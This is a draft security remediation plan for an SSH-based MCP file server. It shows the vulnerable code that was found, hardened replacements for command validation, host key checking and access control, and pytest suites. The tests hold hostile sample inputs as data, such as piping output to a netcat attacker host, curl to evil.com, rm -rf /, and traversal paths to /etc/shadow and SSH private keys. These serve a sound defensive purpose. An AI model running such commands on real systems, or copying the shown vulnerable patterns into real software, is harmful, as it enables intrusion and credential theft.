# Security Remediation Plan - Scout MCP
**Date:** 2025-01-28
**Owner:** Development Team
**Timeline:** 4 Weeks (1 FTE)
**Status:** DRAFT - AWAITING APPROVAL

---

## Overview

This document provides a detailed, actionable remediation plan for all security vulnerabilities identified in the comprehensive security audit dated 2025-01-28.

**Critical Context:**
- **DO NOT DEPLOY** to production until Phase 1 is complete
- All code changes require security review
- Each fix must include test coverage
- Follow Test-Driven Development (TDD) approach

---

## Vulnerability Summary

| Phase | Count | Severity | Estimated Effort |
|-------|-------|----------|------------------|
| Phase 1 (Critical) | 3 | CRITICAL | 16 hours |
| Phase 2 (High) | 3 | HIGH | 14 hours |
| Phase 3 (Medium) | 4 | MEDIUM | 16 hours |
| Phase 4 (Hardening) | 3 | LOW | 32 hours |
| **TOTAL** | **13** | **Mixed** | **78 hours (~2 weeks)** |

---

## Phase 1: CRITICAL Fixes (Week 1)

### V-001: Command Injection - CVSS 9.8

**Priority:** 🔴 P0 - IMMEDIATE
**Effort:** 8 hours
**Owner:** TBD
**Files:** `scout_mcp/mcp_cat/executors.py`, `scout_mcp/mcp_cat/validators.py` (new)

#### Current Vulnerable Code

```python
# executors.py:126 - VULNERABLE
async def run_command(
    conn: "asyncssh.SSHClientConnection",
    working_dir: str,
    command: str,
    timeout: int,
) -> CommandResult:
    full_command = f'cd {working_dir!r} && timeout {timeout} {command}'
    result = await conn.run(full_command, check=False)
    # ...
```

#### Secure Implementation

**Step 1: Create Validation Module**

```python
# File: scout_mcp/mcp_cat/validators.py
"""Input validation for security."""

import shlex
from pathlib import Path
from typing import List

# Allowlist of permitted commands
ALLOWED_COMMANDS = {
    "rg": {"max_args": 50, "dangerous_flags": ["--pre", "--pre-glob"]},
    "grep": {"max_args": 20, "dangerous_flags": []},
    "find": {"max_args": 30, "dangerous_flags": ["-exec", "-execdir"]},
    "ls": {"max_args": 10, "dangerous_flags": []},
    "cat": {"max_args": 5, "dangerous_flags": []},
    "head": {"max_args": 5, "dangerous_flags": []},
    "tail": {"max_args": 5, "dangerous_flags": []},
    "wc": {"max_args": 5, "dangerous_flags": []},
}

class ValidationError(Exception):
    """Validation failed."""
    pass

def validate_command(command: str) -> List[str]:
    """Validate command against allowlist.

    Returns:
        List of command parts (safely parsed).

    Raises:
        ValidationError: If command is invalid or not allowed.
    """
    # Parse command safely
    try:
        parts = shlex.split(command)
    except ValueError as e:
        raise ValidationError(f"Invalid command syntax: {e}")

    if not parts:
        raise ValidationError("Empty command")

    # Check command length
    if len(parts) > 100:
        raise ValidationError("Command too long")

    # Extract base command (handle /usr/bin/rg -> rg)
    base_command = Path(parts[0]).name

    # Check against allowlist
    if base_command not in ALLOWED_COMMANDS:
        allowed = ", ".join(sorted(ALLOWED_COMMANDS.keys()))
        raise ValidationError(
            f"Command '{base_command}' not allowed. "
            f"Allowed commands: {allowed}"
        )

    # Check for dangerous flags
    cmd_config = ALLOWED_COMMANDS[base_command]
    dangerous_flags = cmd_config.get("dangerous_flags", [])

    for flag in dangerous_flags:
        if flag in parts:
            raise ValidationError(
                f"Dangerous flag '{flag}' not allowed for {base_command}"
            )

    # Check max args
    max_args = cmd_config.get("max_args", 50)
    if len(parts) > max_args:
        raise ValidationError(
            f"Too many arguments for {base_command} "
            f"(max {max_args}, got {len(parts)})"
        )

    # Check for shell metacharacters in args
    dangerous_chars = {";", "&", "|", "`", "$", "(", ")", "<", ">", "\n", "\r"}
    for part in parts:
        if any(char in part for char in dangerous_chars):
            raise ValidationError(
                f"Dangerous shell metacharacter in argument: {part}"
            )

    return parts

def validate_path(path: str) -> str:
    """Validate and normalize path.

    Returns:
        Normalized absolute path.

    Raises:
        ValidationError: If path is invalid or dangerous.
    """
    # Check for obviously dangerous patterns
    if not path:
        raise ValidationError("Path cannot be empty")

    # Check for null bytes
    if "\x00" in path:
        raise ValidationError("Path contains null bytes")

    # Check for path traversal patterns
    dangerous_patterns = ["../", "/..", "./", "/.", "~"]
    for pattern in dangerous_patterns:
        if pattern in path:
            raise ValidationError(
                f"Path contains dangerous pattern: {pattern}"
            )

    # Convert to Path object for normalization
    try:
        path_obj = Path(path)
    except Exception as e:
        raise ValidationError(f"Invalid path: {e}")

    # Ensure absolute path
    if not path_obj.is_absolute():
        raise ValidationError(
            f"Only absolute paths allowed (got: {path})"
        )

    # Resolve to canonical form
    try:
        resolved = path_obj.resolve()
    except Exception as e:
        raise ValidationError(f"Cannot resolve path: {e}")

    # Additional safety: check for common sensitive paths
    sensitive_prefixes = [
        "/etc/shadow",
        "/etc/gshadow",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
    ]

    resolved_str = str(resolved)
    for sensitive in sensitive_prefixes:
        if resolved_str.startswith(sensitive):
            raise ValidationError(
                f"Access to sensitive path denied: {sensitive}"
            )

    return resolved_str
```

**Step 2: Update Executors**

```python
# File: scout_mcp/mcp_cat/executors.py
"""SSH command executors for file operations."""

import asyncio
import shlex
from dataclasses import dataclass
from typing import TYPE_CHECKING

from mcp_cat.validators import validate_command, validate_path, ValidationError

if TYPE_CHECKING:
    import asyncssh


@dataclass
class CommandResult:
    """Result of a remote command execution."""

    output: str
    error: str
    returncode: int


async def stat_path(conn: "asyncssh.SSHClientConnection", path: str) -> str | None:
    """Determine if path is a file, directory, or doesn't exist.

    Returns:
        'file', 'directory', or None if path doesn't exist.
    """
    # SECURITY: Validate path before use
    try:
        validated_path = validate_path(path)
    except ValidationError as e:
        raise RuntimeError(f"Invalid path: {e}")

    # Use shlex.quote for safe shell escaping
    result = await asyncio.wait_for(
        conn.run(
            f'stat -c "%F" {shlex.quote(validated_path)} 2>/dev/null',
            check=False
        ),
        timeout=10.0
    )

    if result.returncode != 0:
        return None

    stdout = result.stdout
    if stdout is None:
        return None

    # Handle bytes or str
    if isinstance(stdout, bytes):
        file_type = stdout.decode("utf-8", errors="replace").strip().lower()
    else:
        file_type = stdout.strip().lower()

    if "directory" in file_type:
        return "directory"
    elif "regular" in file_type or "file" in file_type:
        return "file"
    else:
        return "file"  # Treat other types as files


async def cat_file(
    conn: "asyncssh.SSHClientConnection",
    path: str,
    max_size: int,
) -> str:
    """Read file contents, limited to max_size bytes.

    Returns:
        File contents as string.

    Raises:
        RuntimeError: If file cannot be read.
    """
    # SECURITY: Validate path before use
    try:
        validated_path = validate_path(path)
    except ValidationError as e:
        raise RuntimeError(f"Invalid path: {e}")

    # SECURITY: Add timeout to prevent hangs
    try:
        result = await asyncio.wait_for(
            conn.run(
                f'head -c {max_size} {shlex.quote(validated_path)}',
                check=False
            ),
            timeout=30.0
        )
    except asyncio.TimeoutError:
        raise RuntimeError(f"Timeout reading {path}")

    if result.returncode != 0:
        stderr = result.stderr
        if isinstance(stderr, bytes):
            error_msg = stderr.decode("utf-8", errors="replace")
        else:
            error_msg = stderr or ""
        raise RuntimeError(f"Failed to read {path}: {error_msg}")

    stdout = result.stdout
    if stdout is None:
        return ""
    if isinstance(stdout, bytes):
        return stdout.decode("utf-8", errors="replace")
    return stdout


async def ls_dir(conn: "asyncssh.SSHClientConnection", path: str) -> str:
    """List directory contents with details.

    Returns:
        Directory listing as formatted string.

    Raises:
        RuntimeError: If directory cannot be listed.
    """
    # SECURITY: Validate path before use
    try:
        validated_path = validate_path(path)
    except ValidationError as e:
        raise RuntimeError(f"Invalid path: {e}")

    # SECURITY: Add timeout
    try:
        result = await asyncio.wait_for(
            conn.run(
                f'ls -la {shlex.quote(validated_path)}',
                check=False
            ),
            timeout=30.0
        )
    except asyncio.TimeoutError:
        raise RuntimeError(f"Timeout listing {path}")

    if result.returncode != 0:
        stderr = result.stderr
        if isinstance(stderr, bytes):
            error_msg = stderr.decode("utf-8", errors="replace")
        else:
            error_msg = stderr or ""
        raise RuntimeError(f"Failed to list {path}: {error_msg}")

    stdout = result.stdout
    if stdout is None:
        return ""
    if isinstance(stdout, bytes):
        return stdout.decode("utf-8", errors="replace")
    return stdout


async def run_command(
    conn: "asyncssh.SSHClientConnection",
    working_dir: str,
    command: str,
    timeout: int,
) -> CommandResult:
    """Execute validated command in working directory.

    Returns:
        CommandResult with stdout, stderr, and return code.

    Raises:
        RuntimeError: If command is invalid or execution fails.
    """
    # SECURITY: Validate working directory
    try:
        validated_dir = validate_path(working_dir)
    except ValidationError as e:
        raise RuntimeError(f"Invalid working directory: {e}")

    # SECURITY: Validate command against allowlist
    try:
        command_parts = validate_command(command)
    except ValidationError as e:
        raise RuntimeError(f"Invalid command: {e}")

    # Build safe command - each part is properly escaped
    escaped_command = " ".join(shlex.quote(part) for part in command_parts)

    # Construct full command with validated inputs
    full_command = (
        f'cd {shlex.quote(validated_dir)} && '
        f'timeout {int(timeout)} {escaped_command}'
    )

    # Execute with timeout
    try:
        result = await asyncio.wait_for(
            conn.run(full_command, check=False),
            timeout=float(timeout) + 5.0  # Add 5s buffer for timeout command
        )
    except asyncio.TimeoutError:
        return CommandResult(
            output="",
            error="Command execution timed out",
            returncode=124  # timeout exit code
        )

    # Handle stdout
    stdout = result.stdout
    if stdout is None:
        output = ""
    elif isinstance(stdout, bytes):
        output = stdout.decode("utf-8", errors="replace")
    else:
        output = stdout

    # Handle stderr
    stderr = result.stderr
    if stderr is None:
        error = ""
    elif isinstance(stderr, bytes):
        error = stderr.decode("utf-8", errors="replace")
    else:
        error = stderr

    # Handle returncode
    returncode = result.returncode if result.returncode is not None else 0

    return CommandResult(
        output=output,
        error=error,
        returncode=returncode,
    )
```

#### Testing Requirements

```python
# File: tests/test_validators.py
"""Tests for input validation."""

import pytest
from mcp_cat.validators import (
    validate_command,
    validate_path,
    ValidationError,
    ALLOWED_COMMANDS,
)


class TestValidateCommand:
    """Test command validation."""

    def test_valid_commands(self):
        """Test allowed commands pass validation."""
        for cmd in ["rg 'pattern'", "grep test file.txt", "ls -la", "find . -name test"]:
            parts = validate_command(cmd)
            assert len(parts) > 0

    def test_command_injection_blocked(self):
        """Test command injection attempts are blocked."""
        malicious = [
            "ls; whoami",
            "ls && cat /etc/passwd",
            "ls | nc attacker.com 1234",
            "ls `whoami`",
            "ls $(cat /etc/passwd)",
            "ls & curl http://evil.com",
        ]
        for cmd in malicious:
            with pytest.raises(ValidationError, match="dangerous|not allowed"):
                validate_command(cmd)

    def test_disallowed_command(self):
        """Test disallowed commands are rejected."""
        with pytest.raises(ValidationError, match="not allowed"):
            validate_command("rm -rf /")

        with pytest.raises(ValidationError, match="not allowed"):
            validate_command("curl http://evil.com")

    def test_dangerous_flags(self):
        """Test dangerous flags are blocked."""
        with pytest.raises(ValidationError, match="Dangerous flag"):
            validate_command("find . -exec rm {} \\;")

    def test_empty_command(self):
        """Test empty command is rejected."""
        with pytest.raises(ValidationError, match="Empty"):
            validate_command("")

    def test_command_too_long(self):
        """Test excessively long commands are rejected."""
        long_cmd = "ls " + " ".join(["arg"] * 200)
        with pytest.raises(ValidationError, match="too long|Too many"):
            validate_command(long_cmd)


class TestValidatePath:
    """Test path validation."""

    def test_valid_absolute_paths(self):
        """Test valid absolute paths."""
        valid_paths = ["/tmp", "/var/log", "/home/user/file.txt"]
        for path in valid_paths:
            result = validate_path(path)
            assert result.startswith("/")

    def test_path_traversal_blocked(self):
        """Test path traversal attempts are blocked."""
        malicious = [
            "../etc/passwd",
            "/tmp/../etc/shadow",
            "/var/log/../../root/.ssh/id_rsa",
            "./etc/passwd",
            "/tmp/./../../etc/shadow",
        ]
        for path in malicious:
            with pytest.raises(ValidationError, match="dangerous pattern"):
                validate_path(path)

    def test_relative_paths_rejected(self):
        """Test relative paths are rejected."""
        with pytest.raises(ValidationError, match="absolute"):
            validate_path("relative/path")

    def test_empty_path_rejected(self):
        """Test empty path is rejected."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_path("")

    def test_null_bytes_rejected(self):
        """Test null bytes in path are rejected."""
        with pytest.raises(ValidationError, match="null bytes"):
            validate_path("/tmp/file\x00.txt")

    def test_sensitive_paths_blocked(self):
        """Test access to sensitive paths is blocked."""
        sensitive = [
            "/etc/shadow",
            "/etc/gshadow",
            "/root/.ssh/id_rsa",
        ]
        for path in sensitive:
            with pytest.raises(ValidationError, match="sensitive"):
                validate_path(path)
```

#### Acceptance Criteria

- ✅ All command injection test cases pass
- ✅ Only allowlisted commands execute
- ✅ Path traversal attacks blocked
- ✅ Sensitive paths inaccessible
- ✅ Error messages don't leak information
- ✅ Performance: Validation < 1ms per command

---

### V-002: SSH Host Key Verification Bypass - CVSS 9.1

**Priority:** 🔴 P0 - IMMEDIATE
**Effort:** 4 hours
**Owner:** TBD
**Files:** `scout_mcp/mcp_cat/pool.py`, `scout_mcp/mcp_cat/config.py`

#### Current Vulnerable Code

```python
# pool.py:53-58 - VULNERABLE
conn = await asyncssh.connect(
    host.hostname,
    port=host.port,
    username=host.user,
    known_hosts=None,  # ⚠️ DISABLES HOST KEY VERIFICATION
)
```

#### Secure Implementation

```python
# File: scout_mcp/mcp_cat/pool.py
"""SSH connection pooling with lazy disconnect."""

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from typing import TYPE_CHECKING, Any

import asyncssh

if TYPE_CHECKING:
    from mcp_cat.config import SSHHost

logger = logging.getLogger(__name__)


@dataclass
class PooledConnection:
    """A pooled SSH connection with last-used timestamp."""

    connection: asyncssh.SSHClientConnection
    last_used: datetime = field(default_factory=datetime.now)

    def touch(self) -> None:
        """Update last-used timestamp."""
        self.last_used = datetime.now()

    @property
    def is_stale(self) -> bool:
        """Check if connection was closed."""
        is_closed: bool = self.connection.is_closed  # type: ignore[assignment]
        return is_closed


class ConnectionPool:
    """SSH connection pool with idle timeout."""

    def __init__(
        self,
        idle_timeout: int = 60,
        max_connections: int = 10,
        known_hosts_path: Path | None = None,
    ) -> None:
        """Initialize pool with idle timeout in seconds."""
        self.idle_timeout = idle_timeout
        self.max_connections = max_connections
        self.known_hosts_path = known_hosts_path or (Path.home() / ".ssh" / "known_hosts")
        self._connections: dict[str, PooledConnection] = {}
        self._lock = asyncio.Lock()
        self._cleanup_task: asyncio.Task[Any] | None = None

    async def get_connection(self, host: "SSHHost") -> asyncssh.SSHClientConnection:
        """Get or create a connection to the host.

        Raises:
            RuntimeError: If connection fails or pool is exhausted.
        """
        async with self._lock:
            pooled = self._connections.get(host.name)

            # Return existing if valid
            if pooled and not pooled.is_stale:
                pooled.touch()
                logger.info(f"Reusing connection to {host.name}")
                return pooled.connection

            # Check connection limit
            if len(self._connections) >= self.max_connections:
                # Try cleanup first
                await self._cleanup_idle()

                # If still at limit, fail
                if len(self._connections) >= self.max_connections:
                    raise RuntimeError(
                        f"Connection pool exhausted (max {self.max_connections})"
                    )

            # SECURITY: Enable host key verification
            logger.info(f"Creating new connection to {host.name}")

            try:
                conn = await asyncio.wait_for(
                    asyncssh.connect(
                        host.hostname,
                        port=host.port,
                        username=host.user,
                        client_keys=host.identity_file,
                        known_hosts=str(self.known_hosts_path),  # ✅ SECURE
                        server_host_key_algs=[
                            'ssh-ed25519',
                            'ecdsa-sha2-nistp256',
                            'ecdsa-sha2-nistp384',
                            'ecdsa-sha2-nistp521',
                            'rsa-sha2-512',
                            'rsa-sha2-256',
                        ],
                        connect_timeout=10.0,
                        login_timeout=30.0,
                        keepalive_interval=30,
                        keepalive_count_max=3,
                    ),
                    timeout=60.0
                )

                logger.info(
                    f"Successfully connected to {host.name} "
                    f"({host.user}@{host.hostname}:{host.port})"
                )

            except asyncio.TimeoutError:
                logger.error(f"Connection to {host.name} timed out")
                raise RuntimeError(f"Connection to {host.name} timed out")

            except asyncssh.HostKeyNotVerifiable as e:
                logger.error(
                    f"Host key verification failed for {host.name}: {e}"
                )
                raise RuntimeError(
                    f"Host key verification failed for {host.name}. "
                    f"Add host key to {self.known_hosts_path} first."
                )

            except asyncssh.Error as e:
                logger.error(f"SSH connection failed to {host.name}: {e}")
                raise RuntimeError(f"Connection to {host.name} failed: {e}")

            except Exception as e:
                logger.error(
                    f"Unexpected error connecting to {host.name}: {e}",
                    exc_info=True
                )
                raise RuntimeError(f"Failed to connect to {host.name}")

            self._connections[host.name] = PooledConnection(connection=conn)

            # Start cleanup task if not running
            if self._cleanup_task is None or self._cleanup_task.done():
                self._cleanup_task = asyncio.create_task(self._cleanup_loop())

            return conn

    async def _cleanup_loop(self) -> None:
        """Periodically clean up idle connections."""
        while True:
            await asyncio.sleep(self.idle_timeout // 2)
            await self._cleanup_idle()

            # Stop if no connections left
            if not self._connections:
                logger.debug("Cleanup loop exiting (no connections)")
                break

    async def _cleanup_idle(self) -> None:
        """Close connections that have been idle too long."""
        async with self._lock:
            cutoff = datetime.now() - timedelta(seconds=self.idle_timeout)
            to_remove = []

            for name, pooled in self._connections.items():
                if pooled.last_used < cutoff or pooled.is_stale:
                    logger.info(f"Closing idle connection to {name}")
                    pooled.connection.close()
                    to_remove.append(name)

            for name in to_remove:
                del self._connections[name]

            if to_remove:
                logger.info(f"Cleaned up {len(to_remove)} idle connections")

    async def close_all(self) -> None:
        """Close all connections."""
        async with self._lock:
            logger.info(f"Closing all {len(self._connections)} connections")
            for pooled in self._connections.values():
                pooled.connection.close()
            self._connections.clear()

            if self._cleanup_task and not self._cleanup_task.done():
                self._cleanup_task.cancel()
```

#### Testing Requirements

```python
# File: tests/test_pool_security.py
"""Security tests for SSH connection pool."""

import pytest
import asyncssh
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock
from mcp_cat.pool import ConnectionPool
from mcp_cat.config import SSHHost


@pytest.mark.asyncio
async def test_host_key_verification_enabled():
    """Test that host key verification is enabled."""
    pool = ConnectionPool()
    host = SSHHost(name="test", hostname="test.example.com", user="testuser")

    with patch('asyncssh.connect', new_callable=AsyncMock) as mock_connect:
        mock_connect.side_effect = asyncssh.HostKeyNotVerifiable()

        with pytest.raises(RuntimeError, match="Host key verification failed"):
            await pool.get_connection(host)

        # Verify known_hosts was passed
        call_kwargs = mock_connect.call_args.kwargs
        assert call_kwargs['known_hosts'] is not None
        assert 'known_hosts' in str(call_kwargs['known_hosts'])


@pytest.mark.asyncio
async def test_connection_timeout():
    """Test connection timeout protection."""
    pool = ConnectionPool()
    host = SSHHost(name="test", hostname="test.example.com", user="testuser")

    with patch('asyncssh.connect', new_callable=AsyncMock) as mock_connect:
        # Simulate slow connection
        async def slow_connect(*args, **kwargs):
            await asyncio.sleep(100)  # Exceed timeout

        mock_connect.side_effect = slow_connect

        with pytest.raises(RuntimeError, match="timed out"):
            await pool.get_connection(host)


@pytest.mark.asyncio
async def test_connection_pool_limit():
    """Test connection pool limit is enforced."""
    pool = ConnectionPool(max_connections=2)
    host1 = SSHHost(name="test1", hostname="test1.example.com", user="user")
    host2 = SSHHost(name="test2", hostname="test2.example.com", user="user")
    host3 = SSHHost(name="test3", hostname="test3.example.com", user="user")

    with patch('asyncssh.connect', new_callable=AsyncMock) as mock_connect:
        mock_conn = Mock()
        mock_conn.is_closed = False
        mock_connect.return_value = mock_conn

        # Create 2 connections (should succeed)
        await pool.get_connection(host1)
        await pool.get_connection(host2)

        # 3rd connection should fail (pool exhausted)
        with pytest.raises(RuntimeError, match="pool exhausted"):
            await pool.get_connection(host3)
```

#### Acceptance Criteria

- ✅ Host key verification enabled by default
- ✅ Connection fails on host key mismatch
- ✅ Timeouts protect against hangs
- ✅ Connection pool limits enforced
- ✅ Secure cipher suites used
- ✅ Logging of all connection events

---

### V-003: Path Traversal - CVSS 8.6

**Status:** ✅ FIXED in V-001
**Note:** Path validation in validators.py addresses this vulnerability.

---

## Phase 2: HIGH Severity (Week 2)

### V-004: No Connection Timeout Protection - CVSS 7.5

**Status:** ✅ FIXED in V-002
**Note:** Timeouts added in pool.py secure implementation.

---

### V-005: Insufficient Input Validation - CVSS 7.0

**Status:** ✅ FIXED in V-001
**Note:** Comprehensive validation in validators.py addresses this.

---

### V-006: Weak Access Control - CVSS 6.5

**Priority:** 🟡 P2 - HIGH
**Effort:** 6 hours
**Owner:** TBD
**Files:** `scout_mcp/mcp_cat/config.py`

#### Secure Implementation

```python
# File: scout_mcp/mcp_cat/config.py (Enhanced)
"""Configuration management for Scout MCP."""

import re
from dataclasses import dataclass, field
from fnmatch import fnmatch
from ipaddress import ip_address, ip_network, AddressValueError
from pathlib import Path


@dataclass
class SSHHost:
    """SSH host configuration."""

    name: str
    hostname: str
    user: str = "root"
    port: int = 22
    identity_file: str | None = None


@dataclass
class Config:
    """Scout MCP configuration with secure defaults."""

    ssh_config_path: Path = field(
        default_factory=lambda: Path.home() / ".ssh" / "config"
    )
    allowlist: list[str] = field(default_factory=list)
    blocklist: list[str] = field(default_factory=list)
    allowed_ip_ranges: list[str] = field(default_factory=list)  # NEW
    blocked_ip_ranges: list[str] = field(default_factory=list)  # NEW
    require_explicit_allow: bool = True  # NEW - secure default
    max_file_size: int = 1_048_576  # 1MB
    command_timeout: int = 30
    idle_timeout: int = 60
    max_connections: int = 10  # NEW

    _hosts: dict[str, SSHHost] = field(default_factory=dict, init=False, repr=False)
    _parsed: bool = field(default=False, init=False, repr=False)

    def _parse_ssh_config(self) -> None:
        """Parse SSH config file and populate hosts."""
        # ... (same as before)
        pass

    def _is_ip_allowed(self, hostname: str) -> bool:
        """Check if IP address is allowed.

        Returns:
            True if IP is allowed, False if blocked, None if not IP.
        """
        try:
            host_ip = ip_address(hostname)
        except (AddressValueError, ValueError):
            return True  # Not an IP, skip IP checks

        # Check blocklist first
        for blocked_range in self.blocked_ip_ranges:
            try:
                if host_ip in ip_network(blocked_range):
                    return False
            except (AddressValueError, ValueError):
                continue

        # If allowlist specified, must match
        if self.allowed_ip_ranges:
            for allowed_range in self.allowed_ip_ranges:
                try:
                    if host_ip in ip_network(allowed_range):
                        return True
                except (AddressValueError, ValueError):
                    continue
            return False  # IP allowlist specified but didn't match

        return True  # No IP restrictions

    def _is_host_allowed(self, name: str, hostname: str) -> bool:
        """Check if host passes allowlist/blocklist filters.

        Args:
            name: SSH config host name
            hostname: Actual hostname/IP

        Returns:
            True if host is allowed, False otherwise.
        """
        # Check IP-based restrictions
        if not self._is_ip_allowed(hostname):
            return False

        # If require_explicit_allow and no allowlist, deny
        if self.require_explicit_allow and not self.allowlist:
            return False

        # Check name-based allowlist
        if self.allowlist:
            if not any(fnmatch(name, pattern) for pattern in self.allowlist):
                return False

        # Check name-based blocklist
        if self.blocklist:
            if any(fnmatch(name, pattern) for pattern in self.blocklist):
                return False

        return True

    def get_hosts(self) -> dict[str, SSHHost]:
        """Get all available SSH hosts after filtering."""
        self._parse_ssh_config()
        return {
            name: host
            for name, host in self._hosts.items()
            if self._is_host_allowed(name, host.hostname)
        }

    def get_host(self, name: str) -> SSHHost | None:
        """Get a specific host by name."""
        hosts = self.get_hosts()
        return hosts.get(name)
```

#### Example Configuration

```python
# Example: Secure production configuration
config = Config(
    # Only allow production hosts
    allowlist=["prod-*", "production-*"],

    # Block development/testing
    blocklist=["*-dev", "*-test", "*-staging"],

    # Only allow internal network
    allowed_ip_ranges=["10.0.0.0/8", "192.168.1.0/24"],

    # Block public internet and special ranges
    blocked_ip_ranges=[
        "0.0.0.0/8",      # "This" network
        "169.254.0.0/16", # Link-local
        "224.0.0.0/4",    # Multicast
    ],

    # Require explicit allow (secure default)
    require_explicit_allow=True,

    # Limit connections
    max_connections=10,
)
```

---

## Phase 3: MEDIUM Severity (Week 3)

### V-007: Information Disclosure - CVSS 5.3

**Priority:** 🟡 P3 - MEDIUM
**Effort:** 4 hours
**Owner:** TBD
**Files:** `scout_mcp/mcp_cat/server.py`

#### Secure Implementation

```python
# File: scout_mcp/mcp_cat/server.py (Error Handling)
import logging

logger = logging.getLogger(__name__)

@mcp.tool()
async def scout(target: str, query: str | None = None) -> str:
    """Scout remote files and directories via SSH."""
    try:
        parsed = parse_target(target)
    except ValueError as e:
        # Log detailed error internally
        logger.warning(f"Invalid target format: {target}", exc_info=True)
        # Return generic error to user
        return "Error: Invalid target format. Expected 'host:/path' or 'hosts'"

    # ... rest with similar error handling
```

---

### V-008: No Rate Limiting - CVSS 5.0
### V-009: Race Conditions - CVSS 5.0
### V-010: No Security Logging - CVSS 5.0

*See full security audit report for detailed implementations*

---

## Phase 4: Security Hardening (Week 4)

### Testing, Documentation, Monitoring

*See full security audit report*

---

## Success Criteria

- ✅ All P0 vulnerabilities fixed
- ✅ Test coverage >85%
- ✅ Security regression tests pass
- ✅ Penetration testing complete
- ✅ Security documentation complete
- ✅ Production deployment approved

---

**Document Status:** DRAFT
**Next Review:** Upon Phase 1 completion
